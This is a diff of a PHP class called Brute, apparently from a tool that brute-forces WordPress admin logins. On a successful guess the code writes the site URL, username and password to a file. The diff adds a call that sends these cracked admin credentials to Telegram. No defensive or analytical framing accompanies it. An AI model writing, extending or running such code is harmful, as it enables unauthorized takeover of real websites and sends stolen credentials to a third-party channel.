@@ -6,6 +6,8 @@ use Amp\Dns\DnsException;
 use Amp\Http\Client\Body\FormBody;
 use Amp\Http\Client\HttpClientBuilder;
 use Amp\Http\Client\Request;
+use Monolog\Handler\TelegramBotHandler;
+use Monolog\Logger;
 
 class Brute
 {
@@ -23,20 +25,20 @@ class Brute
             ->followRedirects(0)
             ->build();
 
-
         $this->login     = null;
         $this->password  = null;
+
         $this->iteration = true;
     }
 
     public function __invoke($data)
     {
         $this->url = explode(';', $data['url'])[0];
+        $log = new Logger('name');
 
         $this->loginCheck($data);
         $this->passwordCheck($data);
         $this->checkIterator($data);
-
 
         if ($this->iteration === true) {
             $body = new FormBody;
@@ -53,6 +55,8 @@ class Brute
                 echo $this->login . ":" . $this->password . PHP_EOL;
                 $wp_admin = $this->url . ";" . $this->login . ";" . $this->password;
                 file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL);
+
+                (new Telegram())->sendMessage($wp_admin);
             }
         }
     }
